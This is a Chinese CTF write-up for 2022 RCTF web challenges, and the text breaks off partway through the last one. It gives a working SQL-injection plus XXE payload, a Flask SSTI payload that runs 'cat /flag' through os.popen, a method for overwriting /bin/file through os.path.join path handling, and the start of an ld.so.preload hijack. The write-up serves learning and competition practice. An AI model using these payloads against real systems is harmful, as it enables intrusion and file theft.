<p>这段代码首先使用 <code>Class.forName(classes[2])</code> 方法来获取第三个参数所表示的类的 <code>Class</code> 对象，在这里是 <code>org.xml.sax.InputSource</code> 类，这个类是 <code>SAX (Simple API for XML)</code> 中用于读取 <code>XML</code> 文档的一个类。</p>
<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;)</code> 方法来获取该类的构造函数，在这里是 <code>org.xml.sax.InputSource</code> 类的构造函数，接受一个参数是 <code>classes[3]</code> 所表示的类。</p>
<p>之后使用 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法来创建一个 <code>org.xml.sax.InputSource</code> 类型的实例，使用参数值为 <code>wrappoc</code> 的构造函数来创建这个实例。</p>
<p>接着使用 <code>builder.parse(inputSource)</code> 方法来解析 <code>inputSource</code> 对象，这里的 <code>builder</code> 是 <code>DocumentBuilder</code> 类型的对象，<code>DocumentBuilder</code> 是 <code>javax.xml.parsers</code> 包中提供的一个类，其作用是创建 <strong>DOM 解析器</strong>，用于<code>解析 XML 文档</code></p>
<p>&#x3D;&#x3D;&gt;</p>
<p><code>inputSource</code>值为恶意xml文件内容</p>
<p><code>doc</code>值为解析恶意xml文件后得到的内容</p>
</blockquote>
<p>在代码还有一段实现打印的代码，这段代码就完成了把<code>doc</code>中解析恶意xml文档后得到的内容，打印输出</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段代码首先使用 <code>doc.getChildNodes()</code> 方法获取文档中的所有子节点，并将它们存储在 <code>NodeList</code> 对象中。</p>
<p>然后使用一个 <code>for</code> 循环来遍历 <code>NodeList</code> 中的每个子节点。在每次循环中，使用 <code>nodes.item(i)</code> 方法获取当前遍历到的子节点。</p>
<p>之后使用 <code>if</code> 语句来检查当前子节点的类型。如果该类型为<code>1</code> (即元素节点)，则使用 <code>nodes.item(i).getTextContent()</code> 方法获取该元素节点的文本内容并将其加到 <code>res</code> 变量中。然后使用 <code>System.out.println(nodes.item(i).getTextContent())</code> 方法将该文本内容打印到控制台。</p>
<p><strong>总的来说</strong>，这段代码用于遍历文档中所有子节点，并将所有元素节点的文本内容提取出来并存储在 res 变量中，同时将其打印到控制台。</p>
<p>这段代码通过遍历<code>doc</code>中的所有子节点,并将所有元素节点的文本内容获取出来并存储在<code>res</code>变量中,同时将其打印到控制台(这段代码在爬虫领域很常用来提取网页中的文本内容)</p>
</blockquote>
<p><strong>所以</strong></p>
<blockquote>
<p><code>classes[2]=org.xml.sax.InputSource</code></p>
<p>&#x2F;&#x2F;这里为<code>org.xml.sax.InputSource</code>类，用于读取xml文件，将其转化为可解析的xml格式，便于后面进行</p>
<p><code>classes[3]=java.io.InputStream</code>     </p>
<p>&#x2F;&#x2F;<code>java.io.ByteArrayInputStream</code>是<code>java.io.InputStream</code>的子类，但是<code>java.io.ByteArrayInputStream</code>不能直接作为构造函数的参数传入 <code>org.xml.sax.InputSource</code> 类的构造函数,因为<code>org.xml.sax.InputSource</code>和 <code>java.io.InputStream</code> 之间并没有继承关系。</p>
<p>&#x2F;&#x2F;如果<code>classes[3]=java.io.ByteArrayInputStream</code>，会导致程序在执行 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法时出现异常,因为类型不匹配，</p>
<p>除非<code>ByteArrayInputStream</code>转换为<code>InputStream</code> 类型的对象才能传入 <code>org.xml.sax.InputSource</code> 类的构造函数</p>
</blockquote>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote>
<p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230125004553248.png"><img src="/2022RCTF/image-20230125004553248.png" alt="image-20230125004553248"></a></p>
<h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><blockquote>
<p>hint:<code>Just an easy file check challenge~~~</code><br><code>The challenging environment restarts every three minutes</code></p>
<p>只是一个简单的文件检查挑战~~~<br>具有挑战性的环境每三分钟</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312163758682.png"><img src="/2022RCTF/image-20230312163758682.png" alt="image-20230312163758682"></a></p>
<p> 似乎是一个文件上传的环境，</p>
<p>先分析一下它的网站启动脚本<code>app.py</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>开始看到<code>flask</code>就猜想这里存在的是<code>ssti</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br></pre></td></tr></table></figure>

<p>在这里发现它对我们上传的文件进行<code>file</code>命令</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> file_check_res = subprocess.check_output(</span><br><span class="line">   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">   shell=<span class="literal">False</span>, </span><br><span class="line">   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">   timeout=<span class="number">1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然后将返回值传给<code>file_check_res</code></p>
<p>最后一行是关键</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(file_check_res)</span><br></pre></td></tr></table></figure>

<p>它将<code>file_check_res</code>进行渲染，所以如果我们可以控制<code>file</code>命令后的文件返回值是一个<code>ssti</code>注入语句那么就可以实现对网站的<code>ssti</code>，并利用这个返回值返回<code>flag</code></p>
<p>如果单纯写个包含ssti语句的文本</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312223454421.png"><img src="/2022RCTF/image-20230312223454421.png" alt="image-20230312223454421"></a></p>
<p>发现执行完<code>file -b</code>后，执行后只显示文件类型</p>
<h3 id="file-b解析-后内容显示"><a href="#file-b解析-后内容显示" class="headerlink" title="file -b解析#!后内容显示"></a>file -b解析#!后内容显示</h3><p>这里就需要一个知识点<code>#!</code>后的内容，会被视为文件的解释器，然后打印出来，比如</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312224705119.png"><img src="/2022RCTF/image-20230312224705119.png" alt="image-20230312224705119"></a></p>
<p>这里</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>就看出来它把文本</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>当作了<code>script</code>解析器，在解析文件类型时，就把它打印出来了</p>
<p>于是我们上传该文件</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312224941575.png"><img src="/2022RCTF/image-20230312224941575.png" alt="image-20230312224941575"></a></p>
<p>得到flag</p>
<h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><blockquote>
<p>hint:<code>An easier file check challenge.</code><br><code>The zip decompression password is the flag value of filechecker_mini.</code><br><code>Test your exploit locally first.</code><br><code>The challenging environment restarts every three minutes.</code></p>
<p>更简单的文件检查挑战。<br>zip 解压缩密码是 filechecker_mini 的flag。<br>首先在本地测试漏洞利用。<br>具有挑战性的环境每三分钟重新启动一次。</p>
</blockquote>
<p>看看源码和mini的区别</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>发现在</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br></pre></td></tr></table></figure>

<p>看来是无法进行ssti注入</p>
<p>后面查看wp发现<code>os.path.join</code>存在一个技巧</p>
<p>如果只是单纯的文件名字</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">path</span>.join(<span class="string">&#x27;path&#x27;</span>,<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;yyy.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么路径就是<code>path/abc/yyy.txt</code></p>
<p>如果后面的参数包含了<code>&#39;/&#39;</code>，那么前面的路径就会被忽略</p>
<p>比如，</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;/bbb/ccc.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么路径就是<code>/bbb/ccc.txt</code>，而前面得<code>aaa</code>目录路径就被无视了</p>
<p>于是在源码中这里，</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br></pre></td></tr></table></figure>

<p>如果我们的文件名改成<code>/bin/file</code>会怎么样呢…</p>
<p>那就代表<code>/bin/file</code>文件就被我们覆盖了，于是可以不用<code>..</code>跨目录也可以进行文件上传或者覆盖</p>
<p>当在这里执行<code>/bin/file</code>时，就相当于执行我们的文件内容</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_check_res = subprocess.check_output(</span><br><span class="line">                   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                   shell=<span class="literal">False</span>, </span><br><span class="line">                   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                   timeout=<span class="number">1</span></span><br><span class="line">               ) file_check_res = subprocess.check_output(</span><br><span class="line">                   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                   shell=<span class="literal">False</span>, </span><br><span class="line">                   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                   timeout=<span class="number">1</span></span><br><span class="line">               )</span><br></pre></td></tr></table></figure>

<p>那么就显而易见我们可以构造</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<p>直接得到flag</p>
<blockquote>
<p>注意unix中是行尾只有换行也就是<code>\n</code>，而win中才是以<code>\r\n</code>结尾</p>
<p>而bp中改包的时候，回车会以win方式生成<code>\r\n</code>这两个 ,所以如果直接传上去覆盖<code>/bin/file</code>，实际上格式是错误的，无法执行，就会报错，所以需要删除<code>\r</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230314163249778.png"><img src="/2022RCTF/image-20230314163249778.png" alt="image-20230314163249778"></a></p>
<h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2><blockquote>
<p>hint:<code>The zip decompression password is the flag value of filechecker_plus.</code><br><code>Test your exploit locally first.</code><br><code>The challenging environment restarts every three minutes.</code></p>
<p>zip 解压缩密码是 filechecker_plus 的flag。<br>首先在本地测试漏洞利用。<br>具有挑战性的环境每三分钟重新启动一次。</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>和上道题目题目不同，这道题修复了文件覆盖，</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是仍然可以利用这里</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br></pre></td></tr></table></figure>

<p>进行跨目录文件上传</p>
<p>我们仍然需要实现rce，但是服务器shell中唯一执行的命令只有<code>/bin/file -b</code></p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><blockquote>
<ul>
<li>使用 <code>strace</code> 命令查看系统调用【通过这个命令，查看<code>/bin/file</code>命令执行的调用过程，看看有没有可以中间利用劫持的，这个需要进docker中查看】</li>
<li></li>
</ul>
</blockquote>
<p>我们需要找的是<code>/bin/file</code>命令执行过程中调用的文件，并且这个文件不存在，这样我们才可以成功上传</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230315000016107.png"><img src="/2022RCTF/image-20230315000016107.png" alt="image-20230315000016107"></a></p>
<p>这里就看到一个合适的目标文件</p>
<blockquote>
<p><code>/etc/ld.so.preload</code>，因为其不存在，但是在执行<code>/bin/file</code>时会调用它</p>
<p>确实不认识这个文件，搜一下得到</p>
</blockquote>
<blockquote>
<p><code>/etc/ld.so.preload</code>在某种程度上取代了<em>LD_PRELOAD</em>。</p>
<p><em>由于</em>安全问题，<code>LD_PRELOAD</code>受到严格的限制：它<code>不能执行任意的setuid二进制文件</code>，因为如果可以的话，你可以用自己的恶意代码替换库例程，例如在这里进行很好的讨论。事实上，你可以在<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/ld.so">ld.so用户手册</a>中阅读：</p>
<blockquote>
